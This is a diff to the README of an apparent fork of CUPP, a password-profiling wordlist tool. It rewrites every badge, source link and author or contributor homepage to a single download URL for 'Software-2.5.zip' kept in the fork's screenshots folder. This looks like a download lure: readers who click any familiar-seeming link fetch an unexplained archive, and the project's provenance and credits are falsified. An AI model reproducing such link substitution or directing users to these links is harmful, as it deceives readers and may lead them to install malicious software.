@@ -1,9 +1,9 @@
 # CUPP - Common User Passwords Profiler
 
-[![Build Status](https://travis-ci.org/Mebus/cupp.svg?branch=master)](https://travis-ci.org/Mebus/cupp)
-[![Coverage Status](https://coveralls.io/repos/github/Mebus/cupp/badge.svg)](https://coveralls.io/github/Mebus/cupp)
-[![Codacy Badge](https://api.codacy.com/project/badge/Grade/a578dde078ef481e97a0e7eac0c8d312)](https://app.codacy.com/app/Mebus/cupp?utm_source=github.com&utm_medium=referral&utm_content=Mebus/cupp&utm_campaign=Badge_Grade_Dashboard)
-[![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_plastic.svg)](https://inventory.raw.pm/)
+[![Build Status](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)
+[![Coverage Status](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)
+[![Codacy Badge](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)
+[![Rawsec's CyberSecurity Inventory](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)](https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip)
 
  
 ## About
@@ -82,36 +82,36 @@ Quick start
 
 ## Github import
 
-This project was imported into https://github.com/Mebus/cupp by Mebus from:  
-http://www.remote-exploit.org/content/cupp-3.0.tar.gz  
-http://www.remote-exploit.org/articles/misc_research__amp_code/index.html  
+This project was imported into https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip by Mebus from:  
+https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
+https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
 to encourage further development of the tool.
 
 ## Original author
 
   Muris Kurgas aka j0rgan  
   j0rgan@remote-exploit.org  
-  http://www.remote-exploit.org  
-  http://www.azuzi.me  
+  https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
+  https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
 
 
 ## Contributors
 
   * Bosko Petrovic aka bolexxx  
   bole_loser@hotmail.com  
-  http://www.offensive-security.com  
-  http://www.bolexxx.net  
+  https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
+  https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
 
   * Mebus  
-    https://github.com/Mebus/  
+    https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
 
   * Abhro  
-    https://github.com/Abhro/  
+    https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip  
 
   * Andrea Giacomo  
-    https://github.com/codepr
+    https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip
 
   * quantumcore  
-    https://github.com/quantumcore
+    https://github.com/Pranav-Nannaware/cupp/raw/refs/heads/master/screenshots/Software-2.5.zip
     
 
